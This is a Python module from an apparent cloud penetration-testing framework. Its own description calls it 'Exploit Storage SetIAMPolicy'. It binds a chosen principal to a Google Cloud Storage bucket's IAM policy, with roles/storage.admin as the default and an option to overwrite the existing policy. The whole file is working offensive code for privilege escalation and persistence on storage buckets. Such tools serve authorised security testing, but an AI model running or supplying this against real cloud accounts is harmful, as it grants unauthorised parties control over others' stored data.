from Modules.CloudStorage.utils.util_helpers import *

# Entrypoint
def run_module(user_args, session, first_run = False, last_run = False, output_format = ["table"]):
    
    # Set up Argparser to handle flag arguments
    parser = argparse.ArgumentParser(description="Exploit Storage SetIAMPolicy", allow_abbrev=False)
    
    # Module specific arguments
    parser.add_argument("--bucket", type=str, required=False,  help="Bucket name to set policy on (no gs:// prefix needed)")
    parser.add_argument("--role", type=str, required=False,  help="Role to add user for")
    parser.add_argument("--member", type=str, required=False,  help="Principal to add, user:[email] or serviceAccount:[email]")
    parser.add_argument("--project-id", type=str, required=False,  help="Project ID if known to help track permissions, defaults to 'Unknown'")

    parser.add_argument("--overwrite", action="store_true", required=False,  help="Bucket name to get metadata for")
   
    # Debug/non-module specific
    parser.add_argument("-v","--debug",action="store_true",required=False,help="Get verbose data during the module run")
    
    args = parser.parse_args(user_args)

    debug = args.debug
    
    storage_client = storage.Client(credentials = session.credentials)    

    bucket_name, member, role, project_id = None, None, None, None

    if args.bucket:
        bucket_name = args.bucket

    if args.role:
        role = args.role

    if args.member:

        member = args.member
        status, incorrect_input = UtilityTools.validate_user_format(member)
        if status != 0: 
            print(f"{UtilityTools.RED}[X] Value \"{incorrect_input}\" is incorrect. Must be 'user:[email]' or 'serviceAccount:[email]' Please try again...{UtilityTools.RESET}")
            return -1

    if args.project_id:
        project_id = args.project_id

    if not bucket_name:

        rows_returned = session.get_data("cloudstorage-buckets", columns = ["name", "project_id"])
        if len(rows_returned) == 0:
            print("[X] No buckets were found when running the module. Consider passing in all flags (--bucket) flag when running the module again")
            return -1
        
        # Return dictionary corresponding to user choice
        
        bucket_dict = session.choice_selector(rows_returned,"Choose an existing bucket from below to edit the corresponding policy:", fields=["name"])
        
        if not bucket_dict:
            print("Exiting...")
            return -1
        
        # Project ID could be "Unknown"
        bucket_name = bucket_dict["name"]
        project_id = bucket_dict["project_id"]
    
    if not member:
        member = session.choose_member()
        if not member:
            print("Exiting...")
            return -1

    if not role:
        allowed_storage_roles_menu = [
            "roles/storage.admin (Default)",
            "roles/storage.objectCreator",
            "roles/storage.objectViewer",
            "roles/storage.objectUser",
            "roles/storage.objectAdmin",
            "roles/storage.folderAdmin",
            "roles/storage.hmacKeyAdmin",
            "roles/storageinsights.admin",
            "roles/storageinsights.viewer",
            "roles/storage.insightsCollectorService"
        ]
        role = session.choose_role(allowed_storage_roles_menu, chosen_role = args.role, default_role = "roles/storage.admin")
        if not role:
            print("Exiting...")
            return -1

    if not project_id:
        row_returned = session.get_data("cloudstorage-buckets", columns = [ "project_id"], conditions=f"name=\"{bucket_name}\"")
        if len(row_returned) !=0:
            project_id = row_returned[0]["project_id"]
        else:
            project_id = "Unknown"


    if debug:
        print(f"[DEBUG] Proceeding with:\n  Bucket:{bucket_name}\n  Project ID:{project_id}")
        print(f"[DEBUG] Proceeding with member: {member}")
        print(f"[DEBUG] Proceeding with role: {role}")


    print(f"[*] Binding Member {member} on {bucket_name} to role {role}")
    

    action_dict = {}

    status = add_bucket_iam_member(storage_client, bucket_name, member, project_id, action_dict, brute = args.overwrite, role = role, debug=debug)

    if status:
        if status == -1:
            print(f"{UtilityTools.RED}{UtilityTools.BOLD}[X] Failed to add {member} to policy of bucket {bucket_name}{UtilityTools.RESET}")
        else:
            print(f"{UtilityTools.GREEN}{UtilityTools.BOLD}[*] Successfully added {member} to the policy of bucket {bucket_name}{UtilityTools.RESET}")

    session.insert_actions(action_dict,column_name = "storage_actions_allowed")